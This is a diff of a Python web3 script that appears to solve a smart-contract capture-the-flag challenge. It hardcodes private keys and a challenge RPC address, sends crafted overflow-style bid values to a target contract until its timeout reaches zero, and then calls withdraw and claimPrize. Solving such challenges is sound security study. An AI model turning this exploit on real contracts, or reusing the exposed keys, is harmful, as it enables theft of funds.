@@ -4,10 +4,10 @@ from web3.gas_strategies.rpc import rpc_gas_price_strategy
 from solcx import compile_source, install_solc, compile_files
 
 x = {
-    "PrivateKey": "0xe18ab404adc897a79ce1737780753f3fa94ff93dcfe567ad39df2a1dec544cca",
-    "Address": "0x7158F7d140aB76B9F3eEAbC6f76Bb09430BDE334",
-    "TargetAddress": "0x5648359eD2B9BFffdf96e484adfc77Cc5f3273E8",
-    "setupAddress": "0xc3d11B354464FD2E69B7457114C1C261ec0A1c2E"
+    "PrivateKey": "0x1ad4734dfe6cf1ecf589902d3309839d1f0a75a6c48895aa293acfb0b8a7c99e",
+    "Address": "0x186473a28a55655d3f135a1C460CB2fBEA01A824",
+    "TargetAddress": "0x1af67842c2F3f59eE85af65FfBFD542c074814d2",
+    "setupAddress": "0xB7F7b2B0b3375026979d653637dabeF5512EDa89"
 }
 
 PrivateKey =    x["PrivateKey"]
@@ -15,13 +15,14 @@ Address =       x["Address"]
 TargetContract = x["TargetAddress"]
 SetupContract =  x["setupAddress"]
 
-Target2Contract = "0x430D6C8F5A8DE97ecF2AB61C9E07ab7d01A7CF23"
+Target2Contract = "0x70939db114A23e3Bb400ab73E84A402a26783c02"
 
-url = 'http://167.172.62.51:30058/rpc'
+url = 'http://157.245.43.189:30964/rpc'
 
 YEAR = 31556926
 
 values = [2**63, 1, 2*1+1, 2*3+1, 2*7+1 , 2*15+1, 2*31+1, 2*63+1, 2*127+1, 2*255+1, 2*511+1, 2*1023+1, 2*2047+1, 2*4095+1, 2*8191+1, 2*(2**14-1)+1, 2*(2**15-1)+1, 2*(2**16-1)+1, 2*(2**17-1)+1, 2*(2**18-1)+1,2*(2**19-1)+1,2*(2**20-1)+1 ]
+#values = [2**63, 0]
 
 w3 = Web3(Web3.HTTPProvider(url))
 block_number = w3.eth.block_number
@@ -60,11 +61,13 @@ for i in range(index//2 + 1):
 	ii += 1
 	w3.eth.send_transaction({"from":addr, "to":target2,"value":value,})
 	#contract_instance2.functions.attack2(value).transact()
-	
 	print(f'{i}-1')
 	print(f'value = {value}')
+	t = contract_instance.functions.timeout().call()
 	print(contract_instance.functions.topBidder().call())
-	print(contract_instance.functions.timeout().call())
+	print(t)
+	if t == 0:
+		break
 	#print(contract_instance.functions.keyOwner().call())
 
 	value = values[ii]
@@ -78,7 +81,10 @@ for i in range(index//2 + 1):
 	print(contract_instance.functions.timeout().call())
 	#print(contract_instance.functions.keyOwner().call())
 
+contract_instance2.functions.withdraw().call()
 contract_instance.functions.claimPrize().call()
+
+
 
 compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.7.0")
 abi = compiled['Setup.sol:Setup']['abi']
